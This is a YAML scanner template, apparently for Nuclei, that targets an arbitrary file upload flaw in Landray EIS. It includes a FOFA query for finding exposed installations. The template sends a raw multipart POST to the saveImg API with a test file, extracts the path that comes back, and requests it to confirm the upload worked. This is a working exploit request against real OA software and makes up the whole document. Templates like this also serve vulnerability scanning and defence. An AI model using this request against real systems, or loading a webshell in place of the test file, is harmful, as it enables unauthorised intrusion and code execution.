id: landray_eis_upload
info:
  name: 蓝凌EIS任意文件上传
  author: Xc1Ym
  severity: critical
  description: 蓝凌EIS任意文件上传
  metadata:
    max-request: 1
    fofa-query: icon_hash="953405444"
    verified: true
  tags: upload,OA,landray,hw,intrusive
http:
  - raw:
      - |
        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
        Content-Length: 185
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu

        ------WebKitFormBoundaryxdgaqmqu
        Content-Disposition: form-data; name="file"filename="qaxnb.txt"
        Content-Type: text/html

        Hello World
        ------WebKitFormBoundaryxdgaqmqu--

      - |
        GET {{name1}} HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
    extractors:
      - type: regex
        part: body
        internal: true
        name: name1
        regex:
          - (.*)
    matchers:
      - type: word
        words:
          - Hello World
